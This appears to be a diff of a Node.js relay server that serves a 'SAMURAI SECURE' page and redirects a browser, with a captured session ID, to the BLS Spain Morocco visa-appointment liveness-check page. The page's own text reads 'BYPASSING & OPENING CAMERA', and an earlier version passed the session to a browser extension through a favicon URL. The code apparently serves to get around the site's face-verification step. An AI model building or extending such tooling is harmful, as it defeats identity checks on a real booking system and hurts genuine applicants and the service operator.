@@ -11,7 +11,7 @@ const server = http.createServer((req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-    // 🔥 التوجيه الذكي باستخدام بارامتر code= لكي تلتقطه إضافة العميل فوراً
+    // 🔥 التوجيه المباشر لصفحة الكاميرا الرسمية لتجنب أخطاء الـ Favicon والـ 504
     if (req.method === 'GET' && req.url.startsWith('/liveness')) {
         const urlObj = new URL(req.url, 'https://silfi-production.up.railway.app');
         const sessionParam = urlObj.searchParams.get('session');
@@ -35,7 +35,7 @@ const server = http.createServer((req, res) => {
             <body>
                 <div class="card">
                     <h1>SAMURAI SECURE</h1>
-                    <p id="status-text">[ INITIALIZING SECURE CHANNEL ]</p>
+                    <p id="status-text">[ BYPASSING & OPENING CAMERA ]</p>
                     <div class="spinner"></div>
                 </div>
 
@@ -53,9 +53,9 @@ const server = http.createServer((req, res) => {
                             body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: sessionParam })
                         }).catch(e => {});
 
-                        // 🔥 التوجيه الحقيقي بالصيغة الصحيحة code= التي تنتظرها الإضافة لتفعيل الكاميرا 🔥
+                        // 🔥 التوجيه المباشر والآمن لصفحة الـ LivenessRequest الرسمية مع الاحتفاظ بالسيشن 🔥
                         setTimeout(() => {
-                            window.location.replace("https://www.blsspainmorocco.net/assets/images/favicon.png?code=" + encodeURIComponent(sessionParam));
+                            window.location.replace("https://www.blsspainmorocco.net/MAR/appointment/LivenessRequest?session=" + encodeURIComponent(sessionParam));
                         }, 1000);
                     }
                 </script>
